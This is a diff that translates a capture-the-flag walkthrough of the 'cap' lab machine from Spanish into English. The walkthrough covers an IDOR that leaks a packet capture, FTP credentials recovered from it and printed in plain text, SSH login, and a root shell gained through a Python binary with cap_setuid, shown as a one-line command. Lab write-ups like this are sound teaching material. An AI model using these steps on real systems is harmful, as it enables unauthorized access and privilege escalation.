@@ -2,7 +2,7 @@
 
 # Enumeration
 
->Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:
+>We'll start with a port scan using the automatic TCP port scan script I've created:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/cap]
@@ -23,29 +23,29 @@ Puertos TCP abiertos:
 |_  Supported Methods: OPTIONS GET HEAD
 ```
 
->Al acceder al sitio web podemos ver lo siguiente:
+>When we access the website, we can see the following:
 
 ![image](https://github.com/user-attachments/assets/41b03570-9f9b-4f91-8ee0-79f47bd87ff2)
 
->En la siguiente pestaña vemos que en la url se apunta a un data/1, vamos a probar si es vulnerable a IDOR (Insecure Direct Object Reference):
+>On the next tab, we can see that the URL points to a `data/1`; let's check whether it is vulnerable to IDOR (Insecure Direct Object Reference):
 
 ![image](https://github.com/user-attachments/assets/7bd3ca79-111b-4628-ac61-dd9ba2c4823b)
 
->Para ello abriremos burpsuite e interceptaremos la conexión:
+>To do this, we'll open Burp Suite and intercept the connection:
 
 ```bash
 burpsuite &>/dev/null & disown
 ```
 
->Tras probar diversos id vemos que el id 0 nos da datos, por lo que vamos a verlo en el navegador para poder emplear el botón de download previamente visto:
+>After trying out various IDs, we can see that ID 0 returns data, so let's view it in the browser so that we can use the download button we saw earlier:
 
 ![image](https://github.com/user-attachments/assets/67de10f2-4e80-4c7d-97a6-8309dc272292)
 
->Esto nos descargará un archivo .pcap el cual podemos abrir con wireshark dándole click derecho abrir con wireshark, en este podemos encontrar credenciales para el usuario nathan que fueron enviadas por texto plano por FTP: `nathan:Buck3tH4TF0RM3!`
+>This will download a .pcap file, which we can open in Wireshark by right-clicking and selecting "Open with Wireshark". In this file, we can find the credentials for the user ``nathan``, which were sent in plain text via FTP: `nathan:Buck3tH4TF0RM3!`
 
 ![image](https://github.com/user-attachments/assets/9fcd1266-4dab-4b96-b70d-bd20b6f733c6)
 
->Si nos logueamos por ftp veremos la flag user.txt:
+>If we log in via FTP, we'll see the flag user.txt:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/cap]
@@ -72,7 +72,7 @@ local: user.txt remote: user.txt
 33 bytes received in 00:00 (0.49 KiB/s)
 ```
 
->Además, las credenciales son válidas para loguearnos mediante ssh:
+>Furthermore, the credentials can be used to log in via SSH:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/cap]
@@ -83,7 +83,7 @@ nathan@cap:~$
 
 # Privilege Escalation
 
->Si listamos las capabilities de los archivos del sistema vemos las siguientes, de las cuales la interesante es la cap_setuid del binario de python:
+>If we list the capabilities of the system files, we see the following; of these, the one of interest is the `cap_setuid` capability of the Python binary:
 
 ```bash
 nathan@cap:~$ getcap -r / 2>/dev/null
@@ -93,7 +93,7 @@ nathan@cap:~$ getcap -r / 2>/dev/null
 /usr/bin/mtr-packet = cap_net_raw+ep
 ```
 
->Esta capability se puede explotar para ejecutar una shell como el usuario root de la siguiente forma:
+>This vulnerability can be exploited to execute a shell as the root user as follows:
 
 ```bash
 nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
@@ -101,7 +101,7 @@ nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh
 root
 ```
 
->Ahora podemos ir a /root y encontrar la flag root.txt:
+>We can now go to /root and find the flag in root.txt:
 
 ```bash
 # ls /root
